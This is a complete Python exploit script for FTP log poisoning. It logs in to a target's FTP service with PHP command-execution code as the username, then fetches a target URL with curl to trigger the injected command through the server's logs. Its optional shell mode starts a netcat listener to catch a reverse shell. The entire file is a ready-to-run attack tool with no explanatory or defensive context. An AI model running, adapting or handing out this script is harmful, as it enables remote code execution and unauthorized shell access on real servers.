#!/usr/bin/env python3

# FTP Log Poisoning exploit

from ftplib import FTP
import subprocess
import threading
import argparse
from urllib.parse import urlparse


def start_nc(lport):
    subprocess.run(["nc", "-lvnp", str(lport)])

def read_logs(url): 
     subprocess.run(["curl", "-s", url], check=False)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='FTP Log Poisoning exploit')
    parser.add_argument('-u','--url', required=True, help='Target URL')
    parser.add_argument('-p','--port', required=True, help='FTP port', type=int)
    parser.add_argument('-c','--command', required=True, help='Command to execute')
    parser.add_argument('--shell',  action='store_true', help='Open shell')
    parser.add_argument('-l','--lport', help='Listen port', type=int)
    args = parser.parse_args()


    url = args.url
    host = urlparse(url).hostname
    ftp_port = args.port
    command = args.command

    username = f"<?=`{command}`?>"     
    password = "a"    

    if args.shell:
        if not args.lport:
            parser.error("[-] No Listen port")
        else:
            threading.Thread(target=start_nc,args=(args.lport,)).start()

    try:
        print(f"[*] Trying USERNAME: {username} | PASSWORD: {password}")
        ftp = FTP()
        ftp.connect(host, ftp_port)
        ftp.login(user=username, passwd=password)
        ftp.quit()
    except:
        print("[✓] Done")

    read_logs(url)

